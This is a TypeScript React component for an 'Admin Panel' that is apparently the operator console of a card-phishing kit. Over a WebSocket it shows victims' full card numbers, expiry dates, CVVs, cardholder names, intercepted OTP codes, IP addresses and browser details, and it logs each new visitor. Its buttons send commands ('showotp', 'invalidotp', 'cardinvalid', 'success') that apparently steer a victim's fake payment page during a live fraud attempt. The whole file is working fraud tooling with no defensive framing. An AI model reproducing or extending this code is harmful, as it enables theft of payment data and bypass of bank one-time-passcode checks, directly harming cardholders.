
import React, { useState, useEffect } from 'react';

interface CardData {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardHolder: string;
  amount: string;
}

interface UserInfo {
  ip: string;
  browser: string;
  network: string;
}

interface Visitor {
  ip: string;
  timestamp: Date;
}

const AdminPanel = () => {
  const [cardData, setCardData] = useState<CardData | null>(null);
  const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
  const [otp, setOtp] = useState<string>('');
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [ws, setWs] = useState<WebSocket | null>(null);

  useEffect(() => {
    // Create WebSocket server connection
    const websocket = new WebSocket('ws://localhost:8080');
    
    websocket.onopen = () => {
      console.log('Admin panel connected to WebSocket');
    };
    
    websocket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      
      if (data.type === 'cardData') {
        setCardData(data.data);
        setUserInfo(data.userInfo);
        
        // Add new visitor
        const newVisitor = {
          ip: data.userInfo.ip,
          timestamp: new Date()
        };
        setVisitors(prev => [...prev, newVisitor]);
      } else if (data.type === 'otp') {
        setOtp(data.otp);
      } else if (data.type === 'newVisitor') {
        const newVisitor = {
          ip: data.ip,
          timestamp: new Date()
        };
        setVisitors(prev => [...prev, newVisitor]);
      }
    };
    
    setWs(websocket);
    
    return () => {
      websocket.close();
    };
  }, []);

  const sendCommand = (command: string) => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ command }));
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <h1 className="text-3xl font-bold mb-8 text-center">Admin Panel</h1>
      
      {/* Visitors Section */}
      <div className="mb-8">
        <h2 className="text-xl font-bold mb-4">Active Visitors</h2>
        {visitors.map((visitor, index) => (
          <div key={index} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
            New Visitor: {visitor.ip} - {visitor.timestamp.toLocaleTimeString()}
          </div>
        ))}
      </div>

      {/* User Info Section */}
      {userInfo && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">User Information</h2>
          <div className="grid grid-cols-3 gap-4">
            <div>
              <span className="font-bold">IP Address:</span> {userInfo.ip}
            </div>
            <div>
              <span className="font-bold">Browser:</span> {userInfo.browser}
            </div>
            <div>
              <span className="font-bold">Network:</span> {userInfo.network}
            </div>
          </div>
        </div>
      )}

      {/* Card Data Section */}
      {cardData && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">Card Information</h2>
          <div className="font-bold text-lg">
            {cardData.cardNumber} | {cardData.expiryMonth}/{cardData.expiryYear} | {cardData.cvv} | {cardData.cardHolder} | {otp && `OTP: ${otp}`}
          </div>
        </div>
      )}

      {/* Command Buttons */}
      <div className="bg-gray-800 p-4 rounded">
        <h2 className="text-xl font-bold mb-4">Commands</h2>
        <div className="grid grid-cols-3 gap-4">
          <button
            onClick={() => sendCommand('showotp')}
            className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
          >
            Show OTP
          </button>
          <button
            onClick={() => sendCommand('fail')}
            className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
          >
            Fail
          </button>
          <button
            onClick={() => sendCommand('success')}
            className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded"
          >
            Success
          </button>
          <button
            onClick={() => sendCommand('invalidotp')}
            className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded"
          >
            Invalid OTP
          </button>
          <button
            onClick={() => sendCommand('cardinvalid')}
            className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded"
          >
            Card Invalid
          </button>
          <button
            onClick={() => sendCommand('carddisabled')}
            className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-2 px-4 rounded"
          >
            Card Disabled
          </button>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
